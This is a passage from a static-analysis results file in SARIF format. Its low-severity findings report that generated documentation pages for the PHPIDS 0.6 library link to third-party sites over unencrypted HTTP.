      "ruleId" : "4735",
      "message" : {
        "text" : "The file IDS_Monitor.html on line 535 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F0D3C6E6489308A719C0E8512F3A68E9"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
          },
          "region" : {
            "startLine" : 535,
            "endLine" : 535,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Monitor.html:535"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
                },
                "region" : {
                  "startLine" : 535
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Monitor.html:535"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Monitor.html"
                },
                "region" : {
                  "startLine" : 535
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4577",
      "message" : {
        "text" : "The file IDS_Report.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8B672EB4279FD17210008E4A60B3E889"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
          },
          "region" : {
            "startLine" : 38,
            "endLine" : 38,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Report.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Report.html:38"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
                },
                "region" : {
                  "startLine" : 38
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4578",
      "message" : {
        "text" : "The file IDS_Report.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8B672EB4279FD17210008E4A60B3E88A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
          },
          "region" : {
            "startLine" : 39,
            "endLine" : 39,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Report.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Report.html:39"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4579",
      "message" : {
        "text" : "The file IDS_Report.html on line 648 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "8B672EB4279FD17210008E4A60B3E88B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
          },
          "region" : {
            "startLine" : 648,
            "endLine" : 648,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "IDS_Report.html:648"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
                },
                "region" : {
                  "startLine" : 648
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "IDS_Report.html:648"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/IDS_Report.html"
                },
                "region" : {
                  "startLine" : 648
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4677",
      "message" : {
        "text" : "The file _Caching---Database.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "CC2F6ADAFB5497D03702C14E87375876"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4678",
      "message" : {
        "text" : "The file _Caching---Database.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "CC2F6ADAFB5497D03702C14E87375877"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4679",
      "message" : {
        "text" : "The file _Caching---Database.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "CC2F6ADAFB5497D03702C14E87375878"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
          },
          "region" : {
            "startLine" : 90,
            "endLine" : 90,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4680",
      "message" : {
        "text" : "The file _Caching---Database.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "CC2F6ADAFB5497D03702C14E87375879"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
          },
          "region" : {
            "startLine" : 91,
            "endLine" : 91,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4681",
      "message" : {
        "text" : "The file _Caching---Database.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "CC2F6ADAFB5497D03702C14E8737587A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
          },
          "region" : {
            "startLine" : 102,
            "endLine" : 102,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Database.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Database.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4589",
      "message" : {
        "text" : "The file _Caching---Factory.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9072B1B5066DC6286745427559F2F4FB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Factory.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Factory.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4590",
      "message" : {
        "text" : "The file _Caching---Factory.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9072B1B5066DC6286745427559F2F4FC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Factory.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Factory.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4591",
      "message" : {
        "text" : "The file _Caching---Factory.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9072B1B5066DC6286745427559F2F4FD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Factory.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Factory.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Factory.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4669",
      "message" : {
        "text" : "The file _Caching---File.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C7819689A3B57FE1F1266E4D815DDE7F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4670",
      "message" : {
        "text" : "The file _Caching---File.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C7819689A3B57FE1F1266E4D815DDE80"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4671",
      "message" : {
        "text" : "The file _Caching---File.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C7819689A3B57FE1F1266E4D815DDE81"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
          },
          "region" : {
            "startLine" : 90,
            "endLine" : 90,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4672",
      "message" : {
        "text" : "The file _Caching---File.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C7819689A3B57FE1F1266E4D815DDE82"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
          },
          "region" : {
            "startLine" : 91,
            "endLine" : 91,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4673",
      "message" : {
        "text" : "The file _Caching---File.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C7819689A3B57FE1F1266E4D815DDE83"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
          },
          "region" : {
            "startLine" : 102,
            "endLine" : 102,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---File.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---File.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4736",
      "message" : {
        "text" : "The file _Caching---Interface.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F1A6C5686CF5CB6A36C628C3D276BA35"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Interface.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Interface.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4737",
      "message" : {
        "text" : "The file _Caching---Interface.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F1A6C5686CF5CB6A36C628C3D276BA36"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Interface.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Interface.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4738",
      "message" : {
        "text" : "The file _Caching---Interface.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F1A6C5686CF5CB6A36C628C3D276BA37"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Interface.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Interface.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Interface.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4505",
      "message" : {
        "text" : "The file _Caching---Memcached.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5D2D8326A7105BF8EB61125286DB20F7"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4506",
      "message" : {
        "text" : "The file _Caching---Memcached.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5D2D8326A7105BF8EB61125286DB20F8"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4507",
      "message" : {
        "text" : "The file _Caching---Memcached.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5D2D8326A7105BF8EB61125286DB20F9"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
          },
          "region" : {
            "startLine" : 90,
            "endLine" : 90,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4508",
      "message" : {
        "text" : "The file _Caching---Memcached.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5D2D8326A7105BF8EB61125286DB20FA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
          },
          "region" : {
            "startLine" : 91,
            "endLine" : 91,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Caching---Memcached.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Caching---Memcached.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4509",
      "message" : {
